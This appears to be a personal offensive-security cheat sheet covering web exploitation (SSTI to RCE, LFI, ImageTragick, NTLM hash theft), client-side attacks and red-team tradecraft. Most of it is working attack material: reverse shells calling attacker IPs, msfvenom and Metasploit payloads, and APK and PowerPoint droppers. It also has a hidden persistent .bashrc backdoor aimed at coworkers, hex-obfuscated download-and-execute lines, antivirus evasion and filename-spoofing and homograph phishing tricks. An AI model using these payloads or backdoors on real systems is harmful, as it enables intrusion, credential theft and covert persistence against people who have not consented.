http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
-----------

-----------LFI interpreted to base64 to be shown
# https://rileykidd.com/2013/06/05/i-found-an-lfi-now-what/
php://filter/convert.base64-encode/resource=../../example.php
-----------

-----------SSTI (Server Side Template Injection) - From XSS to RCE
# https://portswigger.net/blog/server-side-template-injection
# https://medium.com/bugbountywriteup/frapp%C3%A9-technologies-erpnext-server-side-template-injection-74e1c95ec872
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections
# Jinja2 is used by Python Web Frameworks such as Django or Flask
# Test:
{{7*7}}
# Template format
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}
# Dump all used classes
{{ ''.__class__.__mro__[2].__subclasses__() }}
# Dump all config variables
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
# Read remote file
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
# Write into remote file
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }
# Remote Code Execution via reverse shell
nv -lnvp 8000			--> Listen for connexion
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} # evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  # load the evil config
{{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to evil host
-----------

-----------Tar Command Execution
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Tar%20commands%20execution
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "id" > shell.sh
tar cf test.tar *
-----------

-----------FFmpeg HLS vulnerability AVI file
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files/Ffmpeg%20HLS
# FFmpeg is an open source software used for processing audio and video formats. You can use a malicious HLS playlist inside an AVI video to read arbitrary files.
# https://www.youtube.com/watch?v=tZil9j7TTps
-----------

-----------Image resize bypass - Upload the picture and use a local file inclusion
# JPG
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files/JPG%20Resize
http://localhost/test.php?c=ls
# PNG
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files/PNG%20Resize
You can use it by specifying $_GET[0] as shell_exec and passing a $_POST[1] parameter with the shell command to execute.
curl 'http://localhost/b.php?0=shell_exec' --data "1='ls'"
curl 'http://localhost/test.php?0=system' --data "1='ls'"
-----------

-----------ZIP Symbolic link
#  The user upload a zip with a symboilc link and the server decompress it, so probably we can access to the link from a public folder
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files/ZIP%20Symbolic%20Link
ln -s /etc/passwd link
zip --symlinks test.zip link
-----------

-----------ImageMagick - ImageTragik
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/404afd1d719b59c2a7600b83b5ed4583f8c822e9/Upload%20Insecure%20Files/CVE%20Image%20Tragik
# https://hackerone.com/reports/403417
# https://hackerone.com/reports/412021
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/xxxxxxxxxx.burpcollaborator.net/80 0<&1 2>&1'
pop graphic-context
pop graphic-context
-----------

-----------Xmlrpc - Wordpress, Drupal, etc
# https://www.indusface.com/blog/vulnerability-analysis-remote-code-execution-xml-rpc/
https://example.com/xmlrpc.php			--> if we receive "XML-RPC server accepts POST requests only." we can continue with the attack
hello.txt
  <?xml version="1.0"?>
  <methodCall>
  <methodName>system.listMethods</methodName>
  <params>
  <param>
  </param>
  </params>
  </methodCall>
curl --data @hello.txt http://example.com/xmlrpc.php
-----------

-----------Host header poisoning
# http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
Password reset poisoning
Cache poisoning
-----------

-----------DNS Rebinding
# https://www.youtube.com/watch?time_continue=358&v=Q0JG_eKLcws
# https://github.com/linkedin/jaqen
# https://github.com/brannondorsey/whonow
# Theroy: create your own DNS server, use a low TTL and change the IP for an internal IP in the second request to bypass Same-Origin Policy.
# There is a public whonow server with dynamic DNS Rebinding in rebind.network which can be used to test:
http://a.35.167.72.16.1time.192.168.1.56.forever.123132312dd2d23asdf.rebind.network
# Javascript to access to the internal IP:
x=new XMLHttpRequest();x.open("GET", 'http://a.35.167.72.16.1time.192.168.1.56.forever.123132312dd2d23asdf.rebind.network/index.html', true); x.send();x.onreadystatechange = function () {if(x.status === 200){alert(x.responseText)}}
# Check the Chrome DNS table with: chrome://net-internals/#dns
# Conclusions: It's possible to access to local IPs, no problem with HTTP, with HTTPs you have to configure properly the certificates. 
# It's not possible to get the cookies as they are linked with the domain not IP, but it might be possible to exploit session fixation (submit a cookie and wait the target to log in with it)
# Mitigations: Host header
# https://medium.com/@rhodey/walking-past-same-origin-policy-nat-and-firewall-for-ethereum-wallet-control-30c29b73a057#.m759037se
# https://medium.com/@brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325
# https://github.com/mwrlabs/dref				--> DNS Rebinding framework
-----------

-----------Singularity - DNS Rebinding attack framework
# https://github.com/nccgroup/singularity
-----------

-----------Steal NTLM hashes from website attack & more
# https://blog.blazeinfosec.com/leveraging-web-application-vulnerabilities-to-steal-ntlm-hashes-2/
# https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/
###  From SSRF:
http://127.0.0.X:8000/?url=http://server_listening_responder
### From XSS:
<img src="http://hostname_to_internal_responder">
### From LFI:
http://host.tld/?page=//11.22.33.X/@OsandaMalith
### From XXE:
php://filter/convert.base64-encode/resource=//11.22.33.X/@OsandaMalith
### From MySQL:
http://host.tld/index.php?id=1’ union select 1,2,load_file(‘\\\\192.168.0.X\\@OsandaMalith’),4;%00
### From MSSQL:
';declare @q varchar(99);set @q='\\192.168.254.X\test'; exec master.dbo.xp_dirtree @q
### From Regsvr32:
regsvr32 /s /u /i://35.164.153.X/@OsandaMalith scrobj.dll
### From Batch:
echo 1 > //192.168.0.X/abc
pushd \\192.168.0.X\abc
cmd /k \\192.168.0.X\abc
cmd /c \\192.168.0.X\abc
start \\192.168.0.X\abc
mkdir \\192.168.0.X\abc
type\\192.168.0.X\abc
dir\\192.168.0.X\abc
### From Powershell:
Invoke-Item \\192.168.0.X\aa
Get-Content \\192.168.0.X\aa
Start-Process \\192.168.0.X\aa
### Shell Commands (.scf):		--> You can save this as something.scf and once you open the folder explorer will try to resolve the network path for the icon.
[Shell]
Command=2
IconFile=\\192.168.0.X\test.ico
[Taskbar]
Command=ToggleDesktop
### From shortcut files (.lnk) in Powershell:
# We can create a shortcut containing our network path and as you as you open the shortcut Windows will try to resolve the network path. You can also specify a 
# keyboard shortcut to trigger the shortcut. For the icon you can give the name of a Windows binary or choose an icon from either shell32.dll, Ieframe.dll, 
# imageres.dll, pnidui.dll or wmploc.dll located in the system32 directory.
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("StealMyHashes.lnk")
$lnk.TargetPath = "\\192.168.0.X\@OsandaMalith"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "I will Steal your Hashes"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
### From shortcut files (.lnk) in VBScript:
Set shl = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
currentFolder = shl.CurrentDirectory
Set sc = shl.CreateShortcut(fso.BuildPath(currentFolder, "\StealMyHashes.lnk"))
sc.TargetPath = "\\192.168.0.X\@OsandaMalith"
sc.WindowStyle = 1
sc.HotKey = "Ctrl+Alt+O"
sc.IconLocation = "%windir%\system32\shell32.dll, 3"
sc.Description = "I will Steal your Hashes"
sc.Save
### From internet shortcut (.url):
echo [InternetShortcut] > stealMyHashes.url 
echo URL=file://192.168.0.X/@OsandaMalith >> stealMyHashes.url
### From autorun with Registry:
# In:
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
# Edit a string named Test with:
\\192.168.0.X\asdfa
### Powershell:
Invoke-Item \\192.168.0.X\aa
Get-Content \\192.168.0.X\aa
Start-Process \\192.168.0.X\aa
### From VBScript:
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("//192.168.0.X/aa", 1)
### From JScript:
var fso = new ActiveXObject("Scripting.FileSystemObject")
fso.FileExists("//192.168.0.X/aa")
### From Windows Script Files (.wsf):
<package>
  <job id="boom">
    <script language="VBScript">
       Set fso = CreateObject("Scripting.FileSystemObject")
      Set file = fso.OpenTextFile("//192.168.0.X/aa", 1)
    </script>
   </job>
</package>
### From Shellcode:
https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html
-----------

-----------Keylogger in CSS
# For frameworks like React.js where they sync every input.
# https://blog.segu-info.com.ar/2018/06/keylogger-css-robar-credenciales-traves.html
-----------

-----------Second factor authentication vulnerability scaner - 2FA MFA
# https://github.com/maxwellkoh/2FAssassin
-----------

-----------Server-Side Spreadsheet Injection – Formula Injection to RCE
# https://www.bishopfox.com/blog/2018/06/server-side-spreadsheet-injections/
-----------

-----------ZIP Shotgun - test zip upload (and unzip) for RCE
# https://www.kitploit.com/2018/12/zip-shotgun-utility-script-to-test-zip.html
-----------

-----------Command injection list
# https://www.kitploit.com/2019/02/command-injection-payload-list.html
-----------

-----------Path normalization ****TODO
# https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
# https://www.youtube.com/watch?v=28xWcRegncw
-----------

-----------HTTP/2 only (HTTP2) proxy interception
# https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/may/testing-http2-only-web-services/
-----------

-----------Security headers suggester
# https://www.kitploit.com/2019/03/h2t-scans-website-and-suggests-security.html
-----------

-----------RFI to RCE writing a Windows task
#### Access to:
C:/Windows/System32/Tasks/Microsoft/Office/
Include/modify a task in the --> command tag to execute a binary
-----------

-----------Request Smuggling attacks (cache poisoning)
# https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn
-----------

-----------Aws escalate privileges
# https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation
-----------

-----------Adminer to RCE
# https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f
# https://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html
-----------
=================================><===


=================================>CLIENT/FELLAS SIDE ATTACK <===
-----------Netcat traditional	
sudo apt-get install netcat-traditional
/bin/nc.traditional -l -e /bin/bash 4444
--attacker:
netcat -vv 192.168.1.X
-----------

-----------Netcat without -e
rm /tmp/pipe;mkfifo /tmp/pipe && nc X.X.X.X 1337 </tmp/pipe | /bin/bash &>/tmp/pipe;
shorter:
mkfifo f;cat f|bash -i 2>&1|nc -l X.X.X.X 2222 > f
-----------

-----------Own coworkers tricky, upload to serv ( curl -s http://X.X.X.X/nc.sh | sh )
echo "while [ 1 ]; do rm /tmp/pipe;mkfifo /tmp/pipe && nc X.X.X.X 1337 </tmp/pipe | /bin/bash &>/tmp/pipe; sleep 10; done" >> .-
chmod +x .-
echo "./.- 2>/dev/null&" >> .bashrc
echo "OK"
rm nc
-----------

-----------Netcat listener
nc -lvvp 1337				--> TCP
nc -lvvpu 5555				--> UDP
-----------

-----------Send TCP/UDP packages without nc - Linux
echo "hello" >/dev/udp/X.X.X.X/5555					--> UDP
echo "hello" >/dev/tcp/X.X.X.X/5555					--> TCP
-----------

-----------Msfvenom
# python
msfvenom -p cmd/unix/reverse_python LHOST=X.X.X.X LPORT=2222 -f raw > shell.py
# elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=2222 -f elf > shell.elf
# php
msfvenom -p php/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4444 -f raw > meter.php
# java
msfvenom -p java/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4444 -f raw -o java.jar
# powershell (good for MSSQL sa command execution)
msfvenom -p cmd/windows/reverse_powershell LHOST=X.X.X.X LPORT=4444 -f raw -o powershell.ps
-----------

-----------Msfvenom - encoding payload (usually detected by AV)
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -e x86/shikata_ga_nai -i 200 -f exe > /root/palevo.exe
# -e --> encoder to use
# -i --> number of iterations of the encode
-----------

-----------Meterpreter (only one user)
# python
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD python/meterpreter/reverse_tcp; set LHOST X.X.X.X; set LPORT 2222; run;exit -y"
# elf
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST X.X.X.X; set LPORT 2222; run;exit -y"
# windows
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST X.X.X.X; set LPORT 2222; run;exit -y"
# java
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD java/meterpreter/reverse_tcp; set LHOST X.X.X.X; set LPORT 2222; run;exit -y"
# powershell (good for MSSQL sa command execution)
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD cmd/windows/reverse_powershell; set LHOST X.X.X.X; set LPORT 4444; run;exit -y"
-----------

-----------Meterpreter on docker for a fast deployment
docker run -it -p 8000:8000 pandrew/metasploit /bin/bash
-----------

-----------Meterpreter (multisession)
python.rc (Fichero)
	use exploit/multi/handler
	set PAYLOAD python/meterpreter/reverse_tcp
	set LHOST X.X.X.X
	set LPORT 1234
	set ExitOnSession false
	exploit -j

msfconsole -r python.rc
->background 
->sessions	
-> sessions -i 1
-----------

-----------In case the AV or the IPS stops the stage
set payload windows/meterpreter/reverse_tcp_rc4
--or
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai 
-----------

-----------Autorun commands once the connection is established
--For typical metasploit shell
set AutoRunScript multi_console_command -rc ./persistence_linux.rb
	persistence_linux.rb => sysinfo
--For shell
set AutoRunScript ./persistence_linux.rb
	persistence_linux.rb => session.run_cmd("wget http://X.X.X.X:8000/javashell8.jar -P /tmp")
-----------

-----------Firefox addon metasploit Windows (for linux use target 1)
use exploit/multi/browser/firefox_xpi_bootstrapped_addon
set payload windows/meterpreter/reverse_tcp_rc4
set lhost X.X.X.X
set lport 4444
set rc4password pepe
set addonname XXX Plugin
set uripath XXX_plugin
run
-----------

-----------Static IP (Temporal until the reboot)
sudo ip addr add X.X.X.X dev eth0
sudo ip addr show
-----------

-----------Beef
beef-xss
http://127.0.0.X1:3000/ui/panel
-----------

-----------Beef.html -> with the hook.js library
<html>
<script type=text/javascript src=http://X.X.X.X:3000/hook.js></script>
<html>
-----------

-----------Mitmf with hook.js (inject in all http websites) beef
mitmf --spoof --arp -i eth0 --gateway X.X.1.254 --target X.X.1.193 --inject --js-url http://X.X.1.163:3000/hook.js --log debug
-----------

-----------MITM to downgrade RDP and steal clear text credenials - Port(3389)
https://github.com/SySS-Research
-----------

-----------MITM SSH
# https://github.com/jtesta/ssh-mitm
# https://www.ssh.com/attack/man-in-the-middle
-----------

-----------Beef on docker (to avoid annoying ruby installation)
docker run -it -p 3000:3000 malwarelu/beef /bin/bash
-----------

-----------Meterpreter +info
netsec.ws/?p=331 dfasdf
-----------

-----------SSH x11 display
#vim /etc/ssh/ssh_config 		--> (ForwardX11 yes)
export DISPLAY=:0.0				--> (en host y remoto)
ssh -X root@X.X.X.X
-----------

-----------Follarin Change Desktop Ubuntu
gsettings set org.gnome.desktop.background picture-uri http://goatse.info/hello.jpg
-----------

-----------NC not traditional inverse shell persistent bashrc (I have to clean it)
echo "while [ 1 ]; do rm /tmp/pipe;mkfifo /tmp/pipe && nc X.X.X.X 1336 </tmp/pipe | /bin/bash &>/tmp/pipe; sleep 10; done" >> "/home/$USER/. "
chmod +x "/home/$USER/. "
echo "\"/home/$USER/. \" 2>/dev/null&disown" >> /home/$USER/.bashrc
echo "[ 1962.987529] myapp[3303]: segfault at 0 ip 00400559 sp 5bc7b1b0 error 6 in myapp[400000+1000]"
rm nc
-----------

-----------NC bash execution
wget X.X.X.X/nc 2>/dev/null;chmod +x nc;./nc
Codified:
eval `echo -e "\x65\x63\x68\x6f\x20\x22\x64\x32\x64\x6c\x64\x43\x41\x78\x4e\x7a\x49\x75\x4d\x54\x67\x75\x4d\x53\x34\x78\x4f\x54\x4d\x76\x62\x6d\x4d\x67\x4d\x6a\x34\x76\x5a\x47
\x56\x32\x4c\x32\x35\x31\x62\x47\x77\x37\x59\x32\x68\x74\x62\x32\x51\x67\x4b\x33\x67\x67\x62\x6d\x4d\x37\x4c\x69\x39\x75\x59\x77\x6f\x3d\x22\x20\x7c\x20\x62\x61\x73\x65\x36\x34
\x20\x2d\x64\x20\x7c\x20\x62\x61\x73\x68\x20\x2d"`
-----------

-----------Obfuscator Base64+Hex (/script/ofusbash.sh)
command="$1"
echo "Base64:"
base64=`echo $1|base64`
echo $base64
echo "Base64 exec:"
base64exec=$(echo "echo \"""$base64""\" | base64 -d | bash -")
echo $base64exec
echo "Hex:"
hex=$( echo $command | hexdump -v -e '"\\""x" 1/1 "%02x"' | rev | cut -d "\\" -f 2- | rev )
echo $hex
echo "Hex exec:"	
echo "eval \`echo -e \"""$hex"\"\`
echo "Base64+Hex:"
hexbase64=$( echo $base64exec | hexdump -v -e '"\\""x" 1/1 "%02x"' | rev | cut -d "\\" -f 2- | rev )
echo $hexbase64
echo "Base64+Hex exec:"
echo "eval \`echo -e \"""$hexbase64"\"\`
-----------

-----------Infect an APK with a METERPRETER shell
git clone https://github.com/suraj-root/spade.git
cd /spade
python spade.py Viber_v6.5.0.3367_apkpure.com.apk
install the final apk
# Spade is deprecated, not working yet.
# --
# New tool working 
git clone https://github.com/dana-at-cp/backdoor-apk
cd backdoor-apk/backdoor-apk
# Move the APK file to this folder (backdoor-apk)
./backdoor-apk.sh Cclener.apk
original/dist/ 				--> (here we can find the infected APK)
msfconsole -r backdoor-apk.rc 
./cleanup.sh				--> to clean it
# --
# Manually: http://www.hackplayers.com/2016/12/modificacion-de-una-apk-con-payload-msf.html
-----------

-----------Android METERPRETER commands
activity_start    Start an Android activity from a Uri string
check_root        Check if device is rooted
dump_calllog      Get call log
dump_contacts     Get contacts list
dump_sms          Get sms messages
geolocate         Get current lat-long using geolocation
interval_collect  Manage interval collection capabilities
send_sms          Sends SMS from target session
set_audio_mode    Set Ringer Mode
sqlite_query      Query a SQLite database from storage
wlan_geolocate    Get current lat-long using WLAN information
record_mic     Record audio from the default microphone for X seconds
webcam_chat    Start a video chat
webcam_list    List webcams
webcam_snap    Take a snapshot from the specified webcam
webcam_stream  Play a video stream from the specified webcam
-----------

-----------METERPRETER one session Android
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD android/meterpreter/reverse_http; set LHOST X.X.X.X; set LPORT 4444; run;exit -y"
-----------

-----------Infect POWERPOINT with METERPRETER JAVA shell
# http://www.securitytube.net/video/16849
msfvenom -p java/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4444 -f raw -o java.jar
Create a PowerPoint presentation:
	-Insert -> Object
  	-Create from the file -> Add .jar -> Showed like an icon (change the icon)
    -Action -> Mouse action -> Object action -> Activate Contents
    -Create .ppsx
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD java/meterpreter/reverse_tcp; set LHOST X.X.X.X; set LPORT 4444; run;exit -y
-----------

-----------Unicode to invert file name and extension
# With the Character Map application of windows
# Copy the U+202E character which inverts the writing side
?txt.aene.hta			--> ath.enea.txt	--> executable file
?cod.elpm.exe   		--> exe.mple.doc 	--> executable file
\u202E					--> UNICODE
-----------

-----------Unicode stuff
http://www.utf8-chartable.de/unicode-utf8-table.pl
http://www.fileformat.info/info/unicode/char/202e/index.htm
-----------

-----------Change the icon from a file
ResourceHacker.exe
http://www.angusj.com/resourcehacker/#download
-----------

-----------Disable Startup Service
sudo update-rc.d apache2 disable
-----------

-----------Firefox cookies database (sqlite3 commands)
sqlite3 cookies.sqlite "select * from moz_cookies"
sqlite3 cookies.sqlite "INSERT INTO moz_cookies (baseDomain, name, value, host, path, expiry) VALUES ('pepe.com', 'name', 'value', 'pepe.com', '/', 1521281251)"
sqlite3 cookies.sqlite "delete from moz_cookies where baseDomain LIKE '%webex%'"
-----------

-----------Steal firefox profile to bypass gmail creds/double factor
# http://www.seguridadjabali.com/2017/07/torear-doble-autenticacion-de-google.html
-----------

-----------Meterpreter remove persistence with schedulled task
# Just to remove it after the connection is lost when the file is deleted (there are smarter ways to do it)
sessions -C "execute -f \"cmd\" -a \"/c taskkill /IM check.exe /F\"" -C "cd C:\\\\temp" -C "execute -f \"cmd\" -a \"/c SCHTASKS /Delete /TN check /F\"" 
-C "upload remove-persistence.cmd" -C "execute -f \"cmd\" -a \"/c SchTasks /Create /SC ONCE /TN Cleanup /TR C:\\\\temp\\\\remove-persistence.cmd 
/RU Users /ST 12:50:00\"" -C "execute -f \"cmd\" -a \"/c SchTasks /run /TN Cleanup\"" -C "exit"
-----------

-----------Meterpreter remove persistence injecting a payload in a process
post/windows/manage/multi_meterpreter_inject/multi_meterpreter_inject
   IPLIST   X.X.X.X
   LPORT    6548
   PAYLOAD  windows/x64/meterpreter_reverse_tcp			--> payload/windows/exec
   SESSION  381
   PROCESSNAME  explorer.exe
-----------

-----------Meterpreter dll injection on a process (windows)
use post/windows/manage/reflective_dll_inject2.rb
# It's a small modifaction of the reflective_dll_inject module, where it's possible to define the Process name variable instead of the PID.
sessions -C "run post/windows/manage/reflective_dll_inject2"
# It's possible to do it cause the variables are hardcoded, if you want to change any of them you have to define them globaly from the metasploit console.
To modify the dll:
- git clone https://github.com/stephenfewer/ReflectiveDLLInjection
- Open the rdi.sln project on Visual Studio
- Add the dependences (probably you will need the SDK 8.1)
- Add your code to the ReflectiveDLL.c
- You have the inject.exe to test the .dll locally.
- Obviusly you have to inject the same achitecture .dll (x86/x64/ARM)
-----------

-----------View public IP - windows
nslookup myip.opendns.com. resolver1.opendns.com
-----------

-----------CSV injection - DDE RCE
# https://payatu.com/csv-injection-basic-to-exploit/
=cmd|' /C notepad'!'A1'
-----------

-----------mitm relay for fat client interception ssl/tls (burp)
# https://github.com/jrmdev/mitm_relay
-----------
=================================><===


=================================>RED TEAM <===
-----------MITRE and ATT&CK models
# https://attack.mitre.org/wiki
# https://attack.mitre.org/pre-attack/index.php/Main_Page			--> Pre-Attack
# https://attack.mitre.org/wiki/Main_Page							--> Attack
-----------

-----------Powershell obfuscation
# https://github.com/danielbohannon/Invoke-Obfuscation
# http://www.irongeek.com/i.php?page=videos/derbycon7/t103-invoke-cradlecrafter-moar-powershell-obfusk8tion-detection-techniques-join-daniel-bohannon
# Run powershell:
powershell -sta		--> run it with -sta to avoid problems with the copy command
# Disable Execution Policy in case you need it (plus -sta):
powershell –ExecutionPolicy Bypass -sta
# Install powershell module:
Import-Module ./Invoke-Obfuscation.ps1
# Run:
Invoke-Obfuscation
# Commands:
tutorial 	--> examples
set script 	--> set the script to encode
SET SCRIPTBLOCK Write-Host 'This is my test command' -ForegroundColor Green			--> example powershell script
undo 		--> undo last encoding
test		--> test the command (before applying the launcher)
copy		--> copy the command to the clipboard
# Encode options:
token
string
encoding
launcher
-----------

-----------Infrastructure
# https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki#empire
-----------

-----------Protected view (MotW) - Microsoft
# https://textslashplain.com/2016/04/04/downloads-and-the-mark-of-the-web/
.CSV, .PUB, .XML(powerpoint), RTF.			--> files that can bypass protected view
-----------

-----------Powershell post-exploitation
# https://github.com/xorrior/RandomPS-Scripts
-----------

-----------Anti Malware Scan Interface (AMSI) Windows 7 - powershell
# http://www.irongeek.com/i.php?page=videos/derbycon7/t104-psamsi-an-offensive-powershell-module-for-interacting-with-the-anti-malware-scan-interface-in-windows-10-ryan-cobb
-----------

-----------Password reuse detector
# https://github.com/D4Vinci/Cr3dOv3r
-----------

-----------Dropper in memory - Linux (new versions)
# https://0x00sec.org/t/super-stealthy-droppers/3715
-----------

-----------HTA encryption tool
# https://github.com/nccgroup/demiguise/blob/master/Readme.md
-----------

-----------Red Team Tips - (@vysecurity)
# https://github.com/vysec/RedTips
-----------

-----------Domain fronting
# https://www.xorrior.com/Empire-Domain-Fronting/
Uses a static AWS (awsstatic.com) address and the access through the host option in header.
-----------

-----------Domain fronting list by cdn
# https://github.com/vysec/DomainFrontingLists
-----------

-----------Domain fronting - still alive :)
# https://youtu.be/w1fNGOKkeSg?t=27m59s
-----------

-----------Default exceptions (Paloalto) for TLS inpection - (Domain frontig)
# https://pastebin.com/raw/Fa0nqg5g
# https://youtu.be/w1fNGOKkeSg?t=32m59s
-----------

-----------Funny domains for phishing - homograph attacks - punycode
# https://holdintegrity.com/checker					--> detector/checker
# https://dev.to/loganmeetsworld/homographs-attack--5a1p
Use special latin characters like "ṃ","ṁ","ḍ","ị","ạ", etc.
Some of them like "ị" are not tranformed to weird characters in the browser.
-----------

-----------Homograph - punycode (phishing)
# http://www.kitploit.com/2018/08/homoglyphs-get-similar-letters-convert.html
-----------

-----------Privilege escalation - sudohulk, hooking commands (Linux)
# http://www.hackplayers.com/2018/03/sudohulk-privesc-cambiando-sudo.html
-----------

-----------Privilege escalation, different methods - windows
# https://www.exploit-db.com/docs/english/46131-windows-privilege-escalations.pdf
-----------

-----------Script to install Java for - CobaltStrike
# https://rastamouse.me/2017/09/automated-red-team-infrastructure-deployment-with-terraform---part-2/
#!/bin/bash
java_installer="jdk-8u191-linux-x64.tar.gz"
java_version="jdk1.8.0_191"
cd /usr/local/java
curl -s -j -L -H "Cookie: oraclelicense=accept-securebackup-cookie" http://download.oracle.com/otn-pub/java/jdk/8u191-b12/2787e4a523244c269598db4e85c51e0c/$java_installer -o /usr/local/java/$java_installer
tar zxf $java_installer
chown -R root:root $java_version
echo "export JAVA_HOME=\"/usr/local/java/$java_version\"" >> /etc/profile
echo "export JRE_HOME=\"/usr/local/java/$java_version/jre\"" >> /etc/profile
echo "export PATH=\"$PATH:/usr/local/java/$java_version/bin:/usr/local/java/$java_version/jre/bin\"" >> /etc/profile
echo "export PATH=\"$PATH:/usr/local/java/$java_version/bin:/usr/local/java/$java_version/jre/bin\"" >> /root/.bashrc
update-alternatives --install "/usr/bin/java" "java" "/usr/local/java/$java_version/bin/java" 1
update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/local/java/$java_version/bin/javaws" 1
update-alternatives --set java /usr/local/java/$java_version/bin/java
update-alternatives --set javaws /usr/local/java/$java_version/bin/javaws
-----------

-----------Script to install - CobaltStrike
# https://rastamouse.me/2017/09/automated-red-team-infrastructure-deployment-with-terraform---part-2/
key='xxxx-xxxx-xxxx-xxxx'
token=`curl -s https://www.cobaltstrike.com/download -d "dlkey=${key}" | grep 'href="/downloads/' | cut -d '/' -f3`
curl -s https://www.cobaltstrike.com/downloads/${token}/cobaltstrike-trial.tgz -o /tmp/cobaltstrike.tgz
mkdir /opt/cobaltstrike
tar zxf /tmp/cobaltstrike.tgz -C /opt
echo ${key} > /root/.cobaltstrike.license
rm /tmp/cobaltstrike.tgz
git clone https://github.com/rsmudge/Malleable-C2-Profiles.git /opt/cobaltstrike/c2
-----------

-----------Remove delay - CobaltStrike
sleep 0
-----------

-----------User's shares - CobaltStrike
shell net share
-----------

-----------Mounted shares - CobaltStrike
shell net use
-----------

-----------Domain user permissions - CobaltStrike
shell net user /domain example_adm
-----------

-----------Winrm (Windows Remote Management) - Port(5985) - CobaltStrike
# Option 1:
powershell Invoke-Command -ComputerName computerexamplename -ScriptBlock { Get-ChildItem C:\ }			--> Use hostname not IP address
# Option 2:
powershell icm computerexamplename {ipconfig}								--> Use hostname not IP address
# Old method: 
shell winrs -r:http://192.168.137.10:5985 -u:vagrant -p:vagrant ipconfig
# Start remote session
powershell Enter-PSSession -ComputerName 10.10.10.1 -Credential <USEREXAMPLE>
# Bonus: add a machine to the trust zone (execute with elevated cmd)
winrm set winrm/config/client @{TrustedHosts="computerexamplename"}
-----------

-----------WinRM shell
# https://github.com/Hackplayers/evil-winrm/blob/master/README.md
### Functionalities:
Command History
WinRM command completion
Local files completion
Upload and download files
List remote machine services
FullLanguage Powershell language mode
Load Powershell scripts
Load in memory dll files bypassing some AVs
Load in memory C# (C Sharp) compiled exe files bypassing some AVs
Colorization on output messages (can be disabled optionally)
-----------

-----------Agressor scripts for Persistence, Logging, Etc. - CobaltStrike
# https://github.com/harleyQu1nn/AggressorScripts
-----------

-----------LAPS, periodically changes the local admin account password - CobaltStrike
# https://rastamouse.me/2018/03/laps---part-1/
# https://rastamouse.me/2018/03/laps---part-2/
# https://github.com/leoloobeek/LAPSToolkit/blob/master/LAPSToolkit.ps1
powershell-import
/Tools/LAPSToolkit-master/LAPSToolkit.ps1
-----------

-----------Persistence Summary with commands
# https://rastamouse.me/2018/03/a-view-of-persistence/
### Good persistence summary in userland:
http://www.fuzzysecurity.com/tutorials/19.html
### Many different persistence methods:
http://www.hexacorn.com/blog/category/autostart-persistence/
